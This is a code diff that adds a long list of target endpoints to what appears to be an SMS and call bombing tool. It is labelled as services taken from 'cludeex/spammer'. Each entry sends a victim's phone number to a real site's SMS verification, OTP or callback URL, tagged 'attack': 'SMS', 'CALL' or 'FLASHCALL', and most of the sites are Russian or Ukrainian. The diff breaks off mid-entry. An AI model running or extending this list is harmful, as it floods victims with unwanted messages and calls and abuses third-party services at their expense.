@@ -340,4 +340,935 @@ def extra_urls(number):
             'headers': user_agent()[0],
             'params': {'phone': '+' + number},
         },
+
+    # --- Services from cludeex/spammer ---
+
+        # 2407
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': '2407', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://2407.smartomato.ru/account/session',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Account
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Account', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://account.my.games/signup_send_sms/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.iconjob.co/api/auth/verification_code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.saurisushi.ru/Sauri/api/v2/auth/login',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.pozichka.ua/v1/registration/send',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.kinoland.com.ua/api/v1/service/send-sms',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.imgur.com/account/v1/phones/verify',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://api.hmara.tv/stable/entrance',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://api.eldorado.ua/v1/sign/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.easypay.ua/api/auth/register',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.delitime.ru/api/v2/signup',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.creditter.ru/confirm/sms/send',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.cian.ru/sms/v1/send-validation-code/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.carsmile.com/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api-prime
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api-prime', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api-prime.anytime.global/api/v2/auth/sendVerificationCode',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Api-rest
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Api-rest', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api-rest.logistictech.ru/api/v1.1/clients/request-code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # App
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'App', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://app.benzuber.ru/login',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # App-api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'App-api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Apteka
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Apteka', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://apteka.ru/_action/auth/getForm/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Auth
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Auth', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://auth.multiplex.ua/login',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Avtobzvon
+        {
+            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Avtobzvon', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://avtobzvon.ru/request/makeTestCall',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # B
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'B', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://b.utair.ru/api/v1/login/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Bamper
+        {
+            'info': {'country': 'BY', 'attack': 'SMS', 'website': 'Bamper', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://bamper.by/registration/?step=1',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Bartokyo
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Bartokyo', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://bartokyo.ru/ajax/login.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Bluefin
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Bluefin', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://bluefin.moscow/auth/register/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Cabinet
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Cabinet', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://cabinet.planetakino.ua/service/sms',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Cinema5
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Cinema5', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://cinema5.ru/api/phone_code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # City24
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'City24', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://city24.ua/personalaccount/account/registration',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Client-api
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Client-api', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://client-api.sushi-master.ru/api/v1/auth/init',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Clients
+        {
+            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Clients', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://clients.cleversite.ru/callback/run.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Crm
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Crm', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://crm.getmancar.com.ua/api/veryfyaccount',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # E-groshi
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'E-groshi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://e-groshi.com/online/reg',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Eda
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Eda', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://eda.yandex/api/v1/user/request_authentication_code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Finam
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Finam', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.finam.ru/api/smslocker/sendcode',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Fix-price
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Fix-price', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://fix-price.ru/ajax/register_phone_code.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Flipkart
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Flipkart', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.flipkart.com/api/5/user/otp/generate',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Flipkart
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Flipkart', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.flipkart.com/api/6/user/signup/status',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Foodband
+        {
+            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Foodband', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://foodband.ru/api?call=calls',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Foodband
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Foodband', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://foodband.ru/api/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Guru
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Guru', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://guru.taxi/api/v1/driver/session/verify',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Hatimaki
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Hatimaki', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.hatimaki.ru/register/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Helsi
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Helsi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://helsi.me/api/healthy/accounts/login',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Ingos
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Ingos', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Iqlab
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Iqlab', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://iqlab.com.ua/session/ajaxregister',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # It
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'It', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://it.buzzolls.ru:9995/api/v2/auth/register',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Izi
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Izi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://izi.ua/api/auth/register',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Izi
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Izi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://izi.ua/api/auth/sms-login',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Kaspi
+        {
+            'info': {'country': 'KZ', 'attack': 'SMS', 'website': 'Kaspi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://kaspi.kz/util/send-app-link',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Kilovkusa
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Kilovkusa', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://kilovkusa.ru/ajax.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Koronapay
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Koronapay', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://koronapay.com/transfers/online/api/users/otps',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Lk
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Lk', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://lk.tabris.ru/reg/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Loany
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Loany', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://loany.com.ua/funct/ajax/registration/code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Makarolls
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Makarolls', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Makimaki
+        {
+            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Makimaki', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://makimaki.ru/system/callback.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Menu
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Menu', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.menu.ua/kiev/delivery/registration/direct-registration.html',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Menu
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Menu', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.menu.ua/kiev/delivery/profile/show-verify.html',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Menza-cafe
+        {
+            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Menza-cafe', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://menza-cafe.ru/system/call_me.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Mobileplanet
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Mobileplanet', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://mobileplanet.ua/register',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Moneyman
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Moneyman', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://moneyman.ru/registration_api/actions/send-confirmation-code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Monobank
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Monobank', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.monobank.com.ua/api/mobapplink/send',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Mos
+        {
+            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Mos', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Moyo
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Moyo', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.moyo.ua/identity/registration',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # My
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'My', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://my.modulbank.ru/api/v2/registration/nameAndPhone',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # My
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'My', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://my.mistercash.ua/ru/send/sms/registration',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # My
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'My', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://my.dianet.com.ua/send_sms/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Niyama
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Niyama', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.niyama.ru/ajax/sendSMS.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Nl
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Nl', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.nl.ua',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Nn-card
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Nn-card', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://nn-card.ru/api/1.0/covid/login',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Oapi
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Oapi', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Ok
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Ok', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Okeansushi
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Okeansushi', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://okeansushi.ru/includes/contact.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Ontaxi
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Ontaxi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://ontaxi.com.ua/api/v2/web/client',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Osaka161
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Osaka161', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.osaka161.ru/local/tools/webstroy.webservice.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Ozon
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Ozon', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Panpizza
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Panpizza', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Partner
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Partner', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://partner.uklon.com.ua/api/v1/registration/sendcode',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Pass
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pass', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://pass.rutube.ru/api/accounts/phone/send-password/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Paylate
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Paylate', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://paylate.ru/registry',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Piroginomerodin
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Piroginomerodin', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://piroginomerodin.ru/index.php?route=sms/login/sendreg',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Pizza46
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pizza46', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://pizza46.ru/ajaxGet.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Pizzakazan
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pizzakazan', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://pizzakazan.com/auth/ajax.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Pizzasinizza
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pizzasinizza', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://pizzasinizza.ru/api/phoneCode.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Pliskov
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pliskov', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Qlean
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Qlean', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # R-ulybka
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'R-ulybka', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.r-ulybka.ru/login/form_ajax.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Rendez-vous
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Rendez-vous', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Richfamily
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Richfamily', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Rieltor
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Rieltor', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://rieltor.ua/api/users/register-sms/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Rutaxi
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Rutaxi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://rutaxi.ru/ajax_auth.html',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Sayoris
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sayoris', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://sayoris.ru/?route=parse/whats',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Secure
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Secure', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://secure.ubki.ua/b2_api_xml/ubki/auth',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Secure
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Secure', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://secure.online.ua/ajax/check_phone/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Shafa
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Shafa', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://shafa.ua/api/v3/graphiql',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Shopandshow
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Shopandshow', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://shopandshow.ru/sms/password-request/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Smart
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Smart', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://smart.space/api/users/request_confirmation_code/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Sms4b
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sms4b', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Sportmaster
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Sportmaster', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://www.sportmaster.ua/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Sportmaster
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sportmaster', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://www.sportmaster.ru/user/session/sendSmsCode.do',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Suandshi
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Suandshi', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://suandshi.ru/mobile_api/register_mobile_user',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Sushi-profi
+        {
+            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Sushi-profi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.sushi-profi.ru/api/order/order-call/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Sushifuji
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sushifuji', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://sushifuji.ru/sms_send_ajax.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Sushigourmet
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sushigourmet', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'http://sushigourmet.ru/auth',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Tabasko
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Tabasko', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://tabasko.su/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Tarantino-family
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Tarantino-family', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.tarantino-family.com/wp-admin/admin-ajax.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Taxi-ritm
+        {
+            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Taxi-ritm', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Terra-1
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Terra-1', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://terra-1.indriverapp.com/api/authorization?locale=ru',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Thehive
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Thehive', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://thehive.pro/auth/signup',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Top-shop
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Top-shop', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.top-shop.ru/login/loginByPhone/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Topbladebar
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Topbladebar', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://topbladebar.ru/user_account/ajax222.php?do=sms_code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Uklon
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Uklon', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://uklon.com.ua/api/v1/account/code/send',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Vladimir
+        {
